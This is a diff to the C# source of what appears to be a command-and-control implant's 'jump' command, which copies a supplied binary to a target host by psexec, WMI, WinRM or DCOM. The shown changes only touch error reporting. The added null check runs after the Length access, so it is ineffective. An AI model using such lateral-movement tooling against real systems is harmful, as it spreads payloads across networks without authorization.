@@ -31,7 +31,7 @@ namespace Engineer.Commands
             }
             else
             {
-                Tasking.FillTaskResults("error: " + "No target specified use /target <target>",task,EngTaskStatus.FailedWithWarnings);
+                Tasking.FillTaskResults("error: " + "No target specified use /target <target>",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
             if (task.Arguments.TryGetValue("/method", out string method))
@@ -44,18 +44,18 @@ namespace Engineer.Commands
                 }
                 else
                 {
-                    Tasking.FillTaskResults("error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings);
+                    Tasking.FillTaskResults("error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
             }
             else
             {
-                Tasking.FillTaskResults("error: " + "No method specified use /method <method>, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings);
+                Tasking.FillTaskResults("error: " + "No method specified use /method <method>, valid methods are psexec, wmi, winrm, wmi-ps, dcom",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
-            if (task.File.Length < 1)
+            if (task.File.Length < 1 || task.File == null)
             {
-                Tasking.FillTaskResults("error: no file provided",task,EngTaskStatus.FailedWithWarnings);
+                Tasking.FillTaskResults("error: no file provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
             var binary = task.File;
@@ -81,7 +81,7 @@ namespace Engineer.Commands
             {
                 jumpDcom(target, binary);
             }
-            Tasking.FillTaskResults("Jumped",task,EngTaskStatus.Complete);
+            Tasking.FillTaskResults("Jumped",task,EngTaskStatus.Complete,TaskResponseType.String);
         }
 
         public static void jumpPsexec(string target, byte[] binary)
